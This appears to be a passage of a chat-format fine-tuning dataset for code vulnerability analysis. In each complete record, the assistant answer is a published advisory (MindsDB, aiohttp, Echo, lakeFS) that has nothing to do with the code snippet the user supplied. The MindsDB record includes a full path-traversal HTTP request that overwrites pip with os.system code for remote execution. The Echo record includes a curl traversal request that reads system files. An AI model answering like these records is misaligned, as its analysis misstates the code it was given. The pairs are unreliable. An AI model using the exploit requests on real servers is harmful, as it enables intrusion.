{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nVirtualAuthenticator::VirtualAuthenticator(\n    ::device::FidoTransportProtocol transport)\n    : transport_(transport),\n      unique_id_(base::GenerateGUID()),\n      state_(base::MakeRefCounted<::device::VirtualFidoDevice::State>()) {}\n\n```"}, {"role": "assistant", "content": "MindsDB: Path Traversal in /api/files Leading to Remote Code Execution\n\n### Summary\n\nThere is a path traversal vulnerability in Mindsdb's /api/files interface, which an authenticated attacker can exploit to achieve remote command execution.\n\n### Details\n\nThe vulnerability exists in the \"Upload File\" module, which corresponds to the API endpoint /api/files. The affected code is located at mindsdb/api/http/namespaces/file.py:\n```python\n@ns_conf.route(\"/<name>\")\n@ns_conf.param(\"name\", \"MindsDB's name for file\")\nclass File(Resource):\n    @ns_conf.doc(\"put_file\")\n    @api_endpoint_metrics('PUT', '/files/file')\n    def put(self, name: str):\n        \"\"\"add new file\n        params in FormData:\n            - file\n            - original_file_name [optional]\n        \"\"\"\n\n        data = {}\n        mindsdb_file_name = name\n\n        existing_file_names = ca.file_controller.get_files_names()\n\n        def on_field(field):\n            name = field.field_name.decode()\n            value = field.value.decode()\n            data[name] = value\n\n        file_object = None\n\n        def on_file(file):\n            nonlocal file_object\n            data[\"file\"] = file.file_name.decode()\n            file_object = file.file_object\n\n        temp_dir_path = tempfile.mkdtemp(prefix=\"mindsdb_file_\")\n\n        if request.headers[\"Content-Type\"].startswith(\"multipart/form-data\"):\n            parser = multipart.create_form_parser(\n                headers=request.headers,\n                on_field=on_field,\n                on_file=on_file,\n                config={\n                    \"UPLOAD_DIR\": temp_dir_path.encode(),  # bytes required\n                    \"UPLOAD_KEEP_FILENAME\": True,\n                    \"UPLOAD_KEEP_EXTENSIONS\": True,\n                    \"MAX_MEMORY_FILE_SIZE\": 0,\n                },\n            )\n\n            while True:\n                chunk = request.stream.read(8192)\n                if not chunk:\n                    break\n                parser.write(chunk)\n            parser.finalize()\n            parser.close()\n\n            if file_object is not None:\n                if not file_object.closed:\n                    try:\n                        file_object.flush()\n                    except (AttributeError, ValueError, OSError):\n                        logger.debug(\"Failed to flush file_object before closing.\", exc_info=True)\n                    file_object.close()\n                file_object = None\n        else:\n            data = request.json\n```\nSince the multipart file upload does not perform security checks on the uploaded file path, an attacker can perform path traversal by using ../ sequences in the filename field. The file write operation occurs before calling clear_filename and save_file, meaning there is no filtering of filenames or file types, allowing arbitrary content to be written to any path on the server.\n\n\n### PoC\n\nThis vulnerability can be exploited to overwrite existing executable files, which retain their executable permissions after being overwritten. In addition to conventional file upload exploitation methods, we provide a way to achieve Remote Code Execution (RCE) by leveraging MindsDB's own functionality.\n\nThe API endpoint /<handler_name>/install is used to install handlers, which internally calls install_dependencies to install dependencies via pip. This function executes pip using subprocess.Popen. Therefore, an attacker can:\n\n1. Exploit the vulnerability to overwrite /venv/lib/python3.10/site-packages/pip/__init__.py with a malicious Python script.\n2. Trigger the execution of the malicious script by calling /<handler_name>/install, which invokes pip.\n \nExploit：\n```\nPUT /api/files/mm HTTP/1.1\nHost: ip:47334\nContent-Length: 579\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36\nAccept: application/json, text/plain, */*\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryv9dZC0cAHLlHSHD9\nOrigin: http://ip:47334\nReferer: http://ip:47334/fileUpload\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh,en;q=0.9,zh-CN;q=0.8\nCookie: bid=87948125-5042-4fc8-a692-9cbf71e387be\nConnection: keep-alive\n\n------WebKitFormBoundaryv9dZC0cAHLlHSHD9\nContent-Disposition: form-data; name=\"name\"\n\nmm\n------WebKitFormBoundaryv9dZC0cAHLlHSHD9\nContent-Disposition: form-data; name=\"source\"\n\nmm\n------WebKitFormBoundaryv9dZC0cAHLlHSHD9\nContent-Disposition: form-data; name=\"source_type\"\n\nfile\n------WebKitFormBoundaryv9dZC0cAHLlHSHD9\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../../venv/lib/python3.10/site-packages/pip/__init__.py\"\nContent-Type: text/plain\n\nimport os\nos.system(\"touch /tmp/rce_by_hacker\")\n------WebKitFormBoundaryv9dZC0cAHLlHSHD9--\n```\nAfter sending this request, you can observe the logs in Docker's output:\n```\n2025-05-30 02:26:52,432            http INFO     python_multipart.multipart: Opening a file on disk\n2025-05-30 02:26:52,433            http INFO     python_multipart.multipart: Saving with filename in: b'/root/mdb_storage/tmp/mindsdb_byom_file_89h0zcz0'\n2025-05-30 02:26:52,433            http INFO     python_multipart.multipart: Opening file: b'/root/mdb_storage/tmp/mindsdb_byom_file_89h0zcz0/../../../../../../venv/lib/python3.10/site-packages/pip/__init__.py'\n```\nAt this point, you can see that the file has been successfully overwritten:\n```\nroot@e445c93b2fd5:/mindsdb# cat /venv/lib/python3.10/site-packages/pip/__init__.py\nimport os\nos.system(\"touch /tmp/rce_by_hacker\")\n```\nAfterwards, install any handler in the UI, and you will see that the file rce_by_hacker is successfully created in the /tmp directory. The same result can also be achieved by sending an API request to trigger it.\n\n### Credit\n\nThis vulnerability was discovered by:\n- XlabAI Team of Tencent Xuanwu Lab\n- Atuin Automated Vulnerability Discovery Engine\n\nIf there are any questions regarding the vulnerability details, please feel free to reach out to MindsDB for further discussion at xlabai@tencent.com."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nserver_root_strip(const char *path, int n)\n{\n\tconst char *p;\n\n\t/* Strip strip leading directories. Leading '/' is ignored. */\n\tfor (; n > 0 && *path != '\\0'; n--)\n\t\tif ((p = strchr(++path, '/')) == NULL)\n\t\t\tpath = strchr(path, '\\0');\n\t\telse\n\t\t\tpath = p;\n\n\treturn (path);\n}\n\n```"}, {"role": "assistant", "content": "AIOHTTP vulnerable to  denial of service through large payloads\n\n### Summary\nA request can be crafted in such a way that an aiohttp server's memory fills up uncontrollably during processing.\n\n### Impact\nIf an application includes a handler that uses the `Request.post()` method, an attacker may be able to freeze the server by exhausting the memory.\n\n-----\n\nPatch: https://github.com/aio-libs/aiohttp/commit/b7dbd35375aedbcd712cbae8ad513d56d11cce60"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nuser_extension_get_property (User                  *user,\n                             Daemon                *daemon,\n                             GDBusInterfaceInfo    *interface,\n                             GDBusMethodInvocation *invocation)\n{\n        const GDBusPropertyInfo *property = g_dbus_method_invocation_get_property_info (invocation);\n        g_autoptr(GVariant) value = NULL;\n\n        value = user_extension_get_value (user, interface, property);\n\n        if (value) {\n                g_dbus_method_invocation_return_value (invocation, g_variant_new (\"(v)\", value));\n        }\n        else {\n                g_dbus_method_invocation_return_error (invocation, G_DBUS_ERROR, G_DBUS_ERROR_INVALID_ARGS,\n                                                       \"Key '%s' is not set and has no default value\",\n                                                       property->name);\n        }\n}\n\n```"}, {"role": "assistant", "content": "Echo has a Windows path traversal via backslash in middleware.Static default filesystem\n\n### Summary\nOn Windows, Echo’s `middleware.Static` using the default filesystem allows path traversal via backslashes, enabling\nunauthenticated remote file read outside the static root.\n\n### Details  \n\n  In `middleware/static.go`, the requested path is unescaped and normalized with `path.Clean` (URL semantics).\n  `path.Clean` does **not** treat `\\` as a path separator, so `..\\` sequences remain in the cleaned path. The resulting\n  path is then passed to `currentFS.Open(...)`. When the filesystem is left at the default (nil), Echo uses `defaultFS`\n  which calls `os.Open` (`echo.go:792`). On Windows, `os.Open` treats `\\` as a path separator and resolves `..\\`,\n  allowing traversal outside the static root.\n\n  Relevant code:\n  - `middleware/static.go` (path unescape + `path.Clean` + `currentFS.Open`)\n  - `echo.go` `defaultFS.Open` → `os.Open`\n\n  This is the same class as CVE-2020-36565 (fixed in v4 by switching to OS-aware cleaning), but in v5 the `path.Clean`\n  + defaultFS combination reintroduces the Windows backslash traversal.\n\n\n### PoC\n Windows only.\n\n  **Sample code (main.go):**\n  ```go\n  package main\n\n  import (\n        \"log\"\n        \"net/http\"\n\n        \"github.com/labstack/echo/v5\"\n        \"github.com/labstack/echo/v5/middleware\"\n  )\n\n  func main() {\n        e := echo.New()\n\n        // Important: use middleware.Static with default filesystem (nil)\n        e.Use(middleware.Static(\"public\"))\n\n        e.GET(\"/healthz\", func(c *echo.Context) error {\n                return c.String(http.StatusOK, \"ok\")\n        })\n\n        addr := \":1323\"\n        log.Printf(\"listening on %s\", addr)\n        if err := e.Start(addr); err != nil && err != http.ErrServerClosed {\n                log.Fatal(err)\n        }\n  }\n ```\n  Static file:\n\n  public/index.html\n\n  (content can be any HTML)\n\n  **Run:**\n  go run .\n\n  **Verify:**\n\n  curl http://localhost:1323/index.html\n  curl --path-as-is \"http://localhost:1323/..%5c..%5cWindows%5cSystem32%5cdrivers%5cetc%5chosts\"\n  Expected: 404  \n\n  **Screenshot:**\n<img width=\"884\" height=\"689\" alt=\"image\" src=\"https://github.com/user-attachments/assets/acb14d70-2a43-47c1-8927-2f3da491a853\" />\n<img width=\"1022\" height=\"162\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f2b92aa2-541e-461d-81a2-8a5907d7a447\" />\n\n\n\n  ### Impact\n  Path traversal leading to arbitrary file read outside the static root. Any unauthenticated remote user can\n  read local files that the Echo process has access to on Windows, if `middleware.Static` is used with the default\n  filesystem."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nbool WriteResponsePayloadsV2(\n    NtlmBufferWriter* authenticate_writer,\n    base::span<const uint8_t, kResponseLenV1> lm_response,\n    base::span<const uint8_t, kNtlmProofLenV2> v2_proof,\n    base::span<const uint8_t> v2_proof_input,\n    base::span<const uint8_t> updated_target_info) {\n  return authenticate_writer->WriteBytes(lm_response) &&\n         authenticate_writer->WriteBytes(v2_proof) &&\n         authenticate_writer->WriteBytes(v2_proof_input) &&\n         authenticate_writer->WriteBytes(updated_target_info) &&\n         authenticate_writer->WriteUInt32(0);\n}\n\n```"}, {"role": "assistant", "content": "lakeFS vulnerable to path traversal in local block adapter allow cross-namespace and sibling directory access\n\n## Summary\n\nTwo path traversal vulnerabilities in the local block adapter allow authenticated users to read and write files outside their designated storage boundaries.\n\n## Details\n\nThe local block adapter in `pkg/block/local/adapter.go` had two path traversal vulnerabilities:\n\n### 1. Prefix Bypass Vulnerability\n\nThe `verifyRelPath` function used `strings.HasPrefix()` to verify that requested paths fall within the configured storage directory. This check was insufficient because it validated only the path prefix without requiring a path separator, allowing access to sibling directories with similar names.\n\n**Example:** If the adapter is configured with base path `/data/lakefs`:\n\n| Path | Expected | Actual |\n|------|----------|--------|\n| `/data/lakefs/valid/file.txt` | Allowed | Allowed |\n| `/data/lakefs_evil/secret.txt` | Blocked | **Vulnerable** |\n| `/data/lakefs_backup/data.db` | Blocked | **Vulnerable** |\n\n### 2. Namespace Escape via Identifier\n\nThe adapter verified that resolved paths stayed within the adapter's base path, but did not verify that object identifiers stayed within their designated storage namespace. This allowed attackers to use path traversal sequences in the object identifier to access files in other namespaces.\n\n**Example:** With base path `/data/lakefs` and namespace `local://repo1/userdata`:\n\n| Identifier | Resolved Path | Expected | Actual |\n|------------|---------------|----------|--------|\n| `file.txt` | `/data/lakefs/repo1/userdata/file.txt` | Allowed | Allowed |\n| `../secrets/key.txt` | `/data/lakefs/repo1/secrets/key.txt` | Blocked | **Vulnerable** |\n| `../../other-repo/data.txt` | `/data/lakefs/other-repo/data.txt` | Blocked | **Vulnerable** |\n\nThis vulnerability allows users with access to one namespace to read and write files in other namespaces within the same lakeFS deployment.\n\n## Impact\n\nAuthenticated lakeFS users can:\n\n- **Read and write files in sibling directories** that share the same path prefix as the storage directory (vulnerability 1)\n- **Access files across namespaces** by using path traversal in object identifiers (vulnerability 2)\n\nThis could allow attackers to:\n\n- Read sensitive data from other repositories/namespaces\n- Write malicious files to other namespaces\n- Read/write files in adjacent directories outside lakeFS storage\n- Potentially escalate privileges if writable directories are used by other services\n\nThis vulnerability **only affects** deployments using the local block adapter. Deployments using S3, GCS, Azure, or other object storage backends are **not affected**.\n\n## Patches\n\nFixed in version v1.77.0.\n\nThe fixes:\n1. Append a path separator to prefix checks, ensuring paths must be within the storage directory\n2. Add two-level path validation: verify both that namespace paths stay within the adapter's base path AND that resolved paths stay within their designated namespace\n\n## Workarounds\n\n- Configure the storage path with a unique name unlikely to be a prefix of other directories\n- Restrict filesystem permissions for the lakeFS process\n- Ensure no sensitive data exists in sibling directories\n\n## Credit\n\nDiscovered via CodeQL static analysis."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nWORD32 ih264d_video_decode(iv_obj_t *dec_hdl, void *pv_api_ip, void *pv_api_op)\n{\n /* ! */\n\n dec_struct_t * ps_dec = (dec_struct_t *)(dec_hdl->pv_codec_handle);\n\n    WORD32 i4_err_status = 0;\n    UWORD8 *pu1_buf = NULL;\n    WORD32 buflen;\n    UWORD32 u4_max_ofst, u4_length_of_start_code = 0;\n\n    UWORD32 bytes_consumed = 0;\n    UWORD32 cur_slice_is_nonref = 0;\n    UWORD32 u4_next_is_aud;\n    UWORD32 u4_first_start_code_found = 0;\n    WORD32 ret = 0,api_ret_value = IV_SUCCESS;\n    WORD32 header_data_left = 0,frame_data_left = 0;\n    UWORD8 *pu1_bitstrm_buf;\n ivd_video_decode_ip_t *ps_dec_ip;\n ivd_video_decode_op_t *ps_dec_op;\n\n    ithread_set_name((void*)\"Parse_thread\");\n\n    ps_dec_ip = (ivd_video_decode_ip_t *)pv_api_ip;\n    ps_dec_op = (ivd_video_decode_op_t *)pv_api_op;\n\n {\n        UWORD32 u4_size;\n        u4_size = ps_dec_op->u4_size;\n        memset(ps_dec_op, 0, sizeof(ivd_video_decode_op_t));\n        ps_dec_op->u4_size = u4_size;\n }\n\n    ps_dec->pv_dec_out = ps_dec_op;\n if(ps_dec->init_done != 1)\n {\n return IV_FAIL;\n }\n\n /*Data memory barries instruction,so that bitstream write by the application is complete*/\n    DATA_SYNC();\n\n if(0 == ps_dec->u1_flushfrm)\n {\n if(ps_dec_ip->pv_stream_buffer == NULL)\n {\n            ps_dec_op->u4_error_code |= 1 << IVD_UNSUPPORTEDPARAM;\n            ps_dec_op->u4_error_code |= IVD_DEC_FRM_BS_BUF_NULL;\n return IV_FAIL;\n }\n if(ps_dec_ip->u4_num_Bytes <= 0)\n {\n            ps_dec_op->u4_error_code |= 1 << IVD_UNSUPPORTEDPARAM;\n            ps_dec_op->u4_error_code |= IVD_DEC_NUMBYTES_INV;\n return IV_FAIL;\n\n }\n }\n    ps_dec->u1_pic_decode_done = 0;\n\n    ps_dec_op->u4_num_bytes_consumed = 0;\n\n    ps_dec->ps_out_buffer = NULL;\n\n if(ps_dec_ip->u4_size\n >= offsetof(ivd_video_decode_ip_t, s_out_buffer))\n        ps_dec->ps_out_buffer = &ps_dec_ip->s_out_buffer;\n\n    ps_dec->u4_fmt_conv_cur_row = 0;\n\n    ps_dec->u4_output_present = 0;\n    ps_dec->s_disp_op.u4_error_code = 1;\n    ps_dec->u4_fmt_conv_num_rows = FMT_CONV_NUM_ROWS;\n if(0 == ps_dec->u4_share_disp_buf\n && ps_dec->i4_decode_header == 0)\n {\n        UWORD32 i;\n if((ps_dec->ps_out_buffer->u4_num_bufs == 0) ||\n (ps_dec->ps_out_buffer->u4_num_bufs > IVD_VIDDEC_MAX_IO_BUFFERS))\n {\n            ps_dec_op->u4_error_code |= 1 << IVD_UNSUPPORTEDPARAM;\n            ps_dec_op->u4_error_code |= IVD_DISP_FRM_ZERO_OP_BUFS;\n return IV_FAIL;\n }\n\n for(i = 0; i < ps_dec->ps_out_buffer->u4_num_bufs; i++)\n {\n if(ps_dec->ps_out_buffer->pu1_bufs[i] == NULL)\n {\n                ps_dec_op->u4_error_code |= 1 << IVD_UNSUPPORTEDPARAM;\n                ps_dec_op->u4_error_code |= IVD_DISP_FRM_OP_BUF_NULL;\n return IV_FAIL;\n }\n\n if(ps_dec->ps_out_buffer->u4_min_out_buf_size[i] == 0)\n {\n                ps_dec_op->u4_error_code |= 1 << IVD_UNSUPPORTEDPARAM;\n                ps_dec_op->u4_error_code |=\n                                IVD_DISP_FRM_ZERO_OP_BUF_SIZE;\n return IV_FAIL;\n }\n }\n }\n\n if(ps_dec->u4_total_frames_decoded >= NUM_FRAMES_LIMIT)\n {\n        ps_dec_op->u4_error_code = ERROR_FRAME_LIMIT_OVER;\n return IV_FAIL;\n }\n\n /* ! */\n    ps_dec->u4_ts = ps_dec_ip->u4_ts;\n\n    ps_dec_op->u4_error_code = 0;\n    ps_dec_op->e_pic_type = -1;\n    ps_dec_op->u4_output_present = 0;\n    ps_dec_op->u4_frame_decoded_flag = 0;\n\n    ps_dec->i4_frametype = -1;\n    ps_dec->i4_content_type = -1;\n\n    ps_dec->u4_slice_start_code_found = 0;\n\n /* In case the deocder is not in flush mode(in shared mode),\n     then decoder has to pick up a buffer to write current frame.\n     Check if a frame is available in such cases */\n\n if(ps_dec->u1_init_dec_flag == 1 && ps_dec->u4_share_disp_buf == 1\n && ps_dec->u1_flushfrm == 0)\n {\n        UWORD32 i;\n\n        WORD32 disp_avail = 0, free_id;\n\n /* Check if at least one buffer is available with the codec */\n /* If not then return to application with error */\n for(i = 0; i < ps_dec->u1_pic_bufs; i++)\n {\n if(0 == ps_dec->u4_disp_buf_mapping[i]\n || 1 == ps_dec->u4_disp_buf_to_be_freed[i])\n {\n                disp_avail = 1;\n break;\n }\n\n }\n\n if(0 == disp_avail)\n {\n /* If something is queued for display wait for that buffer to be returned */\n\n            ps_dec_op->u4_error_code = IVD_DEC_REF_BUF_NULL;\n            ps_dec_op->u4_error_code |= (1 << IVD_UNSUPPORTEDPARAM);\n return (IV_FAIL);\n }\n\n while(1)\n {\n pic_buffer_t *ps_pic_buf;\n            ps_pic_buf = (pic_buffer_t *)ih264_buf_mgr_get_next_free(\n (buf_mgr_t *)ps_dec->pv_pic_buf_mgr, &free_id);\n\n if(ps_pic_buf == NULL)\n {\n                UWORD32 i, display_queued = 0;\n\n /* check if any buffer was given for display which is not returned yet */\n for(i = 0; i < (MAX_DISP_BUFS_NEW); i++)\n {\n if(0 != ps_dec->u4_disp_buf_mapping[i])\n {\n                        display_queued = 1;\n break;\n }\n }\n /* If some buffer is queued for display, then codec has to singal an error and wait\n                 for that buffer to be returned.\n                 If nothing is queued for display then codec has ownership of all display buffers\n                 and it can reuse any of the existing buffers and continue decoding */\n\n if(1 == display_queued)\n {\n /* If something is queued for display wait for that buffer to be returned */\n                    ps_dec_op->u4_error_code = IVD_DEC_REF_BUF_NULL;\n                    ps_dec_op->u4_error_code |= (1\n << IVD_UNSUPPORTEDPARAM);\n return (IV_FAIL);\n }\n }\n else\n {\n /* If the buffer is with display, then mark it as in use and then look for a buffer again */\n if(1 == ps_dec->u4_disp_buf_mapping[free_id])\n {\n                    ih264_buf_mgr_set_status(\n (buf_mgr_t *)ps_dec->pv_pic_buf_mgr,\n                                    free_id,\n                                    BUF_MGR_IO);\n }\n else\n {\n /**\n                     *  Found a free buffer for present call. Release it now.\n                     *  Will be again obtained later.\n                     */\n                    ih264_buf_mgr_release((buf_mgr_t *)ps_dec->pv_pic_buf_mgr,\n                                          free_id,\n                                          BUF_MGR_IO);\n break;\n }\n }\n }\n\n }\n\n if(ps_dec->u1_flushfrm)\n {\n if(ps_dec->u1_init_dec_flag == 0)\n {\n /*Come out of flush mode and return*/\n            ps_dec->u1_flushfrm = 0;\n return (IV_FAIL);\n }\n\n\n\n        ih264d_get_next_display_field(ps_dec, ps_dec->ps_out_buffer,\n &(ps_dec->s_disp_op));\n if(0 == ps_dec->s_disp_op.u4_error_code)\n {\n /* check output buffer size given by the application */\n if(check_app_out_buf_size(ps_dec) != IV_SUCCESS)\n {\n                ps_dec_op->u4_error_code= IVD_DISP_FRM_ZERO_OP_BUF_SIZE;\n return (IV_FAIL);\n }\n\n            ps_dec->u4_fmt_conv_cur_row = 0;\n            ps_dec->u4_fmt_conv_num_rows = ps_dec->s_disp_frame_info.u4_y_ht;\n            ih264d_format_convert(ps_dec, &(ps_dec->s_disp_op),\n                                  ps_dec->u4_fmt_conv_cur_row,\n                                  ps_dec->u4_fmt_conv_num_rows);\n            ps_dec->u4_fmt_conv_cur_row += ps_dec->u4_fmt_conv_num_rows;\n            ps_dec->u4_output_present = 1;\n\n }\n        ih264d_release_display_field(ps_dec, &(ps_dec->s_disp_op));\n\n        ps_dec_op->u4_pic_wd = (UWORD32)ps_dec->u2_disp_width;\n        ps_dec_op->u4_pic_ht = (UWORD32)ps_dec->u2_disp_height;\n\n        ps_dec_op->u4_new_seq = 0;\n\n        ps_dec_op->u4_output_present = ps_dec->u4_output_present;\n        ps_dec_op->u4_progressive_frame_flag =\n                        ps_dec->s_disp_op.u4_progressive_frame_flag;\n        ps_dec_op->e_output_format =\n                        ps_dec->s_disp_op.e_output_format;\n        ps_dec_op->s_disp_frm_buf = ps_dec->s_disp_op.s_disp_frm_buf;\n        ps_dec_op->e4_fld_type = ps_dec->s_disp_op.e4_fld_type;\n        ps_dec_op->u4_ts = ps_dec->s_disp_op.u4_ts;\n        ps_dec_op->u4_disp_buf_id = ps_dec->s_disp_op.u4_disp_buf_id;\n\n /*In the case of flush ,since no frame is decoded set pic type as invalid*/\n        ps_dec_op->u4_is_ref_flag = -1;\n        ps_dec_op->e_pic_type = IV_NA_FRAME;\n        ps_dec_op->u4_frame_decoded_flag = 0;\n\n if(0 == ps_dec->s_disp_op.u4_error_code)\n {\n return (IV_SUCCESS);\n }\n else\n return (IV_FAIL);\n\n }\n if(ps_dec->u1_res_changed == 1)\n {\n /*if resolution has changed and all buffers have been flushed, reset decoder*/\n        ih264d_init_decoder(ps_dec);\n }\n\n    ps_dec->u4_prev_nal_skipped = 0;\n\n    ps_dec->u2_cur_mb_addr = 0;\n    ps_dec->u2_total_mbs_coded = 0;\n    ps_dec->u2_cur_slice_num = 0;\n    ps_dec->cur_dec_mb_num = 0;\n    ps_dec->cur_recon_mb_num = 0;\n    ps_dec->u4_first_slice_in_pic = 1;\n    ps_dec->u1_slice_header_done = 0;\n    ps_dec->u1_dangling_field = 0;\n\n    ps_dec->u4_dec_thread_created = 0;\n    ps_dec->u4_bs_deblk_thread_created = 0;\n    ps_dec->u4_cur_bs_mb_num = 0;\n    ps_dec->u4_start_recon_deblk  = 0;\n    ps_dec->u4_sps_cnt_in_process = 0;\n\n    DEBUG_THREADS_PRINTF(\" Starting process call\\n\");\n\n\n    ps_dec->u4_pic_buf_got = 0;\n\n do\n {\n        WORD32 buf_size;\n\n        pu1_buf = (UWORD8*)ps_dec_ip->pv_stream_buffer\n + ps_dec_op->u4_num_bytes_consumed;\n\n        u4_max_ofst = ps_dec_ip->u4_num_Bytes\n - ps_dec_op->u4_num_bytes_consumed;\n\n /* If dynamic bitstream buffer is not allocated and\n         * header decode is done, then allocate dynamic bitstream buffer\n         */\n if((NULL == ps_dec->pu1_bits_buf_dynamic) &&\n (ps_dec->i4_header_decoded & 1))\n {\n            WORD32 size;\n\n void *pv_buf;\n void *pv_mem_ctxt = ps_dec->pv_mem_ctxt;\n            size = MAX(256000, ps_dec->u2_pic_wd * ps_dec->u2_pic_ht * 3 / 2);\n            pv_buf = ps_dec->pf_aligned_alloc(pv_mem_ctxt, 128,\n                                              size + EXTRA_BS_OFFSET);\n            RETURN_IF((NULL == pv_buf), IV_FAIL);\n            ps_dec->pu1_bits_buf_dynamic = pv_buf;\n            ps_dec->u4_dynamic_bits_buf_size = size;\n }\n\n if(ps_dec->pu1_bits_buf_dynamic)\n {\n            pu1_bitstrm_buf = ps_dec->pu1_bits_buf_dynamic;\n            buf_size = ps_dec->u4_dynamic_bits_buf_size;\n }\n else\n {\n            pu1_bitstrm_buf = ps_dec->pu1_bits_buf_static;\n            buf_size = ps_dec->u4_static_bits_buf_size;\n }\n\n        u4_next_is_aud = 0;\n\n        buflen = ih264d_find_start_code(pu1_buf, 0, u4_max_ofst,\n &u4_length_of_start_code,\n &u4_next_is_aud);\n\n if(buflen == -1)\n            buflen = 0;\n /* Ignore bytes beyond the allocated size of intermediate buffer */\n /* Since 8 bytes are read ahead, ensure 8 bytes are free at the\n        end of the buffer, which will be memset to 0 after emulation prevention */\n        buflen = MIN(buflen, buf_size - 8);\n\n        bytes_consumed = buflen + u4_length_of_start_code;\n        ps_dec_op->u4_num_bytes_consumed += bytes_consumed;\n\n {\n            UWORD8 u1_firstbyte, u1_nal_ref_idc;\n\n if(ps_dec->i4_app_skip_mode == IVD_SKIP_B)\n {\n                u1_firstbyte = *(pu1_buf + u4_length_of_start_code);\n                u1_nal_ref_idc = (UWORD8)(NAL_REF_IDC(u1_firstbyte));\n if(u1_nal_ref_idc == 0)\n {\n /*skip non reference frames*/\n                    cur_slice_is_nonref = 1;\n continue;\n }\n else\n {\n if(1 == cur_slice_is_nonref)\n {\n /*We have encountered a referenced frame,return to app*/\n                        ps_dec_op->u4_num_bytes_consumed -=\n                                        bytes_consumed;\n                        ps_dec_op->e_pic_type = IV_B_FRAME;\n                        ps_dec_op->u4_error_code =\n                                        IVD_DEC_FRM_SKIPPED;\n                        ps_dec_op->u4_error_code |= (1\n << IVD_UNSUPPORTEDPARAM);\n                        ps_dec_op->u4_frame_decoded_flag = 0;\n                        ps_dec_op->u4_size =\n sizeof(ivd_video_decode_op_t);\n /*signal the decode thread*/\n                        ih264d_signal_decode_thread(ps_dec);\n /* close deblock thread if it is not closed yet*/\n if(ps_dec->u4_num_cores == 3)\n {\n                            ih264d_signal_bs_deblk_thread(ps_dec);\n }\n\n return (IV_FAIL);\n }\n }\n\n }\n\n }\n\n\n if(buflen)\n {\n            memcpy(pu1_bitstrm_buf, pu1_buf + u4_length_of_start_code,\n                   buflen);\n /* Decoder may read extra 8 bytes near end of the frame */\n if((buflen + 8) < buf_size)\n {\n                memset(pu1_bitstrm_buf + buflen, 0, 8);\n }\n            u4_first_start_code_found = 1;\n\n }\n else\n {\n /*start code not found*/\n\n if(u4_first_start_code_found == 0)\n {\n /*no start codes found in current process call*/\n\n                ps_dec->i4_error_code = ERROR_START_CODE_NOT_FOUND;\n                ps_dec_op->u4_error_code |= 1 << IVD_INSUFFICIENTDATA;\n\n if(ps_dec->u4_pic_buf_got == 0)\n {\n\n                    ih264d_fill_output_struct_from_context(ps_dec,\n                                                           ps_dec_op);\n\n                    ps_dec_op->u4_error_code = ps_dec->i4_error_code;\n                    ps_dec_op->u4_frame_decoded_flag = 0;\n\n return (IV_FAIL);\n }\n else\n {\n                    ps_dec->u1_pic_decode_done = 1;\n continue;\n }\n }\n else\n {\n /* a start code has already been found earlier in the same process call*/\n                frame_data_left = 0;\n                header_data_left = 0;\n continue;\n }\n\n }\n\n        ps_dec->u4_return_to_app = 0;\n        ret = ih264d_parse_nal_unit(dec_hdl, ps_dec_op,\n                              pu1_bitstrm_buf, buflen);\n if(ret != OK)\n {\n            UWORD32 error =  ih264d_map_error(ret);\n            ps_dec_op->u4_error_code = error | ret;\n            api_ret_value = IV_FAIL;\n\n if((ret == IVD_RES_CHANGED)\n || (ret == IVD_MEM_ALLOC_FAILED)\n || (ret == ERROR_UNAVAIL_PICBUF_T)\n || (ret == ERROR_UNAVAIL_MVBUF_T)\n || (ret == ERROR_INV_SPS_PPS_T)\n || (ret == IVD_DISP_FRM_ZERO_OP_BUF_SIZE))\n {\n                ps_dec->u4_slice_start_code_found = 0;\n break;\n }\n\n if((ret == ERROR_INCOMPLETE_FRAME) || (ret == ERROR_DANGLING_FIELD_IN_PIC))\n {\n                ps_dec_op->u4_num_bytes_consumed -= bytes_consumed;\n                api_ret_value = IV_FAIL;\n break;\n }\n\n if(ret == ERROR_IN_LAST_SLICE_OF_PIC)\n {\n                api_ret_value = IV_FAIL;\n break;\n }\n\n }\n\n if(ps_dec->u4_return_to_app)\n {\n /*We have encountered a referenced frame,return to app*/\n            ps_dec_op->u4_num_bytes_consumed -= bytes_consumed;\n            ps_dec_op->u4_error_code = IVD_DEC_FRM_SKIPPED;\n            ps_dec_op->u4_error_code |= (1 << IVD_UNSUPPORTEDPARAM);\n            ps_dec_op->u4_frame_decoded_flag = 0;\n            ps_dec_op->u4_size = sizeof(ivd_video_decode_op_t);\n /*signal the decode thread*/\n            ih264d_signal_decode_thread(ps_dec);\n /* close deblock thread if it is not closed yet*/\n if(ps_dec->u4_num_cores == 3)\n {\n                ih264d_signal_bs_deblk_thread(ps_dec);\n }\n return (IV_FAIL);\n\n }\n\n\n\n        header_data_left = ((ps_dec->i4_decode_header == 1)\n && (ps_dec->i4_header_decoded != 3)\n && (ps_dec_op->u4_num_bytes_consumed\n < ps_dec_ip->u4_num_Bytes));\n        frame_data_left = (((ps_dec->i4_decode_header == 0)\n && ((ps_dec->u1_pic_decode_done == 0)\n || (u4_next_is_aud == 1)))\n && (ps_dec_op->u4_num_bytes_consumed\n < ps_dec_ip->u4_num_Bytes));\n }\n while(( header_data_left == 1)||(frame_data_left == 1));\n\n if((ps_dec->u4_pic_buf_got == 1)\n && (ret != IVD_MEM_ALLOC_FAILED)\n && ps_dec->u2_total_mbs_coded < 